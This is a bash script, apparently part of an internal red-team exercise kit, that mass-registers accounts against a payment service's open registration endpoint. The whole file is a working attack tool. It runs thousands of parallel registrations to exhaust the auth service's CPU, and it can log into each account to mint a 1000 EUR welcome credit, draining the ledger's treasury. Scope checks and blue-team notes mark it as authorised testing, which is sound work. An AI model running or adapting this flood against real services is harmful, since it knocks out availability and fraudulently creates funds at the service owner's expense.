#!/bin/bash
# 06 - Mass account creation (registration flood) against our own SI.
# Abuses open self-registration (no email verification). Two edges:
#   1) argon2id hashing per register is CPU-expensive -> volumetric registration
#      is a cheap CPU-exhaustion DoS on auth-service.
#   2) MODE=full also opens each account (GET /accounts/me), minting the fictive
#      1000 EUR welcome credit -> 10k accounts = 10 000 000 EUR from treasury,
#      which stresses ledger accounting.
# Usage: TARGET=172.16.147.10 COUNT=10000 ./account-flood.sh
#   Env: TARGET, PORT, COUNT (default 10000), CONCURRENCY (default 100),
#        MODE=full (register+login+open account) | register (users only)
# Stop: Ctrl-C (also: pkill -f account-flood)
set -uo pipefail
source "$(dirname "$0")/../_lib/guard.sh"

TARGET="${TARGET:-172.16.147.10}"
PORT="${PORT:-8080}"
COUNT="${COUNT:-10000}"
CONCURRENCY="${CONCURRENCY:-100}"
MODE="${MODE:-full}"
PW="${PW:-FloodRun2026!xyz}"       # >=10 chars
ra_require_scope "$TARGET"

BASE="http://$TARGET:$PORT"
RUN="$(date +%s)"
OUTDIR="$(ra_logdir acctflood)"
RESULTS="$OUTDIR/codes.txt"; : > "$RESULTS"

echo "[*] Target: $BASE   COUNT=$COUNT  CONCURRENCY=$CONCURRENCY  MODE=$MODE"
echo "[*] Started: $(ra_now)   Logs: $OUTDIR"
echo "[*] Blue team: watch auth-service CPU, register req/s, 429/503, DB rows, treasury balance."
hbefore=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "$BASE/health" || echo 000)
echo "[*] /health before: $hbefore"

# One registration (+ optional account opening). Appends its outcome code.
flood_one() {
  local i="$1" email code tok
  email="flood-$RUN-$i@pay.local"
  code=$(curl -s -o /dev/null -w '%{http_code}' -m 15 -H 'Content-Type: application/json' \
    -X POST "$BASE/api/auth/register" \
    -d "{\"email\":\"$email\",\"full_name\":\"Flood $i\",\"password\":\"$PW\"}" || echo 000)
  if [ "$MODE" = full ] && { [ "$code" = 201 ] || [ "$code" = 200 ]; }; then
    tok=$(curl -s -m 15 -H 'Content-Type: application/json' -X POST "$BASE/api/auth/login" \
      -d "{\"email\":\"$email\",\"password\":\"$PW\"}" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
    [ -n "$tok" ] && curl -s -o /dev/null -m 15 -H "Authorization: Bearer $tok" "$BASE/api/payments/accounts/me" || true
  fi
  echo "$code" >> "$RESULTS"
}
export -f flood_one
export BASE RUN MODE PW RESULTS

cleanup() { echo ""; echo "[*] Stopping... $(ra_now)"; }
trap cleanup INT TERM

echo "[*] Launching $COUNT registrations @ $CONCURRENCY in parallel..."
SECONDS=0
seq 1 "$COUNT" | xargs -P "$CONCURRENCY" -I{} bash -c 'flood_one "$@"' _ {} || true
dur=$SECONDS

ok=$(grep -cxE '201|200' "$RESULTS" || true)
rl=$(grep -cx '429' "$RESULTS" || true)
sv=$(grep -cxE '503|502|500|000' "$RESULTS" || true)
hafter=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "$BASE/health" || echo 000)

echo ""
echo "=== SUMMARY $(ra_now) ==="
echo "  duration      : ${dur}s   (~$(( COUNT / (dur>0?dur:1) )) reg/s attempted)"
echo "  created (2xx) : $ok / $COUNT"
echo "  rate-limited  : $rl   (429 — a registration throttle would show here)"
echo "  errors/5xx/to : $sv   (service strain)"
echo "  code breakdown:"; sort "$RESULTS" | uniq -c | sort -rn | sed 's/^/    /'
echo "  /health before -> after : $hbefore -> $hafter"
[ "$rl" = 0 ] && echo "  [!] No 429 seen: registration is NOT rate-limited (V5). Mass creation unthrottled."
[ "$MODE" = full ] && echo "  [i] MODE=full: each opened account minted 1000 EUR; check ledger integrity / treasury on the Hôte."
echo "[*] Evidence: $OUTDIR"
